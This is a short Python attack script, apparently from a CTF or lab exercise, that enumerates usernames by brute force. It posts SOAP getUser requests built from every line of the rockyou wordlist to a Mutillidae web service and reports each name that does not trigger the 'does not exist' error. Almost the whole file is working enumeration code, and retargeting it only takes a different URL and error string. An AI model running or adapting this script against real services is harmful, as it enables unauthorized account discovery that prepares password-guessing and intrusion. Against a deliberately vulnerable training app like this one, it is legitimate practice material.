#################################################################
#Objective: 
# Brute-force for user enumeration 
#Description: 
# SOAP request BF through POST method to try enumerate usernames 
#Date:
# 19/07/2018
#################################################################

import requests

def file_lengthy(fname):
	i=0
	with open(fname,'rb') as f:
		for l in f:
			i=i+1
	return i

#wordfile to use
wordfile = "/home/gr3g/ctf/wordlist/rockyou.txt"
wdLines = file_lengthy(wordfile)

print("Dictionnaire",wordfile,"has",wdLines,"entries.")

wd = open(wordfile)

#content return when error
match='does not exist'

#target URL
url = "http://192.168.1.1/MUTILLIDAE/webservices/soap/ws-user-account.php"

#referer
header = {
	'Content-Type':'text/xml;charset=UTF-8',
	'SOAPAction':'"urn:ws-user-account#getUser"'
} 

#to know how many usernames have been tested
i = 0

for entry in wd:
	entry = entry.rstrip("\n")
	
	body = """ <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
	<soapenv:Header/>
		<soapenv:Body>
			<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
				<username xsi:type="xsd:string">"""+entry+"""</username>
			</urn:getUser>
		</soapenv:Body>
	</soapenv:Envelope>"""

	request = requests.post(url, headers = header, data = body).text
	#print(request)

	if match not in request: 
		print(entry,' is in database')

	i = i+1
	if i%10000==0:
		progress = (i / wdLines)*100
		print(progress,' % of the dic done')
